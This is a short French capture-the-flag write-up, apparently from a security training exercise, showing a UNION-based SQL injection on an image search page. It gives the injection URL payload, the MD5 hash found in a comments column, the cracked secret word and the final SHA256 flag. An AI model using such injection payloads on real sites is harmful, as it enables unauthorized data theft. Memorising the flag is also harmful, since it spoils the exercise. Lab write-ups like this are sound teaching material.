## Faille : SQL Injection (UNION Based)

**Description :**
Une injection SQL sur la page de recherche d'images permet d'extraire des données de tables non prévues, ici la table contenant des indices de flag.

**Étapes de l'exploitation :**
1. Injection via l'URL : `?page=searchimg&id=-1 UNION SELECT 1,comment FROM list_images`.
2. Récupération d'un hash MD5 dans les commentaires : `1928e8083cf461a51303633093573c46`.
3. Décodage du MD5 pour obtenir le mot secret : **albatroz**.
   <img width="945" height="602" alt="image" src="https://github.com/user-attachments/assets/c10232a4-d7e5-4357-a907-8ad70fca13f6" />

4. Hachage du mot "albatroz" en SHA256 pour générer le flag final.
   <img width="945" height="487" alt="image" src="https://github.com/user-attachments/assets/56440512-96c6-4070-b0f6-eb46a2f6c5fc" />


**Flag obtenu :**
`F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188`

